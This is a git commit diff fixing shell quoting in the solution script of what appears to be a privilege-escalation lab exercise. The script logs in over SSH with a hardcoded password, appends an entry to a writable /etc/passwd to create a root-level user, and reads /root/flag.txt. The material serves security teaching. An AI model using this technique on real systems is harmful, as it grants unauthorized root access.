21d78002360d4532f2dce8c9ca9e96f9100f4a8a
Catalin Iovita <cataliniovita@yahoo.com>
2022-07-25 22:42:43 +0300

    Modify solution for first task

--- privilege-escalation/activities/writable/sol/solution.sh
+++ privilege-escalation/activities/writable/sol/solution.sh
@@ -8,5 +8,5 @@ then
     echo "No IP supplied. Please provide the target IP address!"
 else
     ip=$1
-    sshpass -pYvFWPeC7sTWJdaYQ ssh -o StrictHostKeyChecking=no jack@127.0.0.1 -p 2022 "echo $passwd >> /etc/passwd && echo "sparrow" | su -c \"cat /root/flag.txt\" sparrow"
+    sshpass -pYvFWPeC7sTWJdaYQ ssh -o StrictHostKeyChecking=no jack@127.0.0.1 -p 2022 "echo $passwd >> /etc/passwd && echo \"sparrow\" | su -c \"cat /root/flag.txt\" sparrow"
 fi
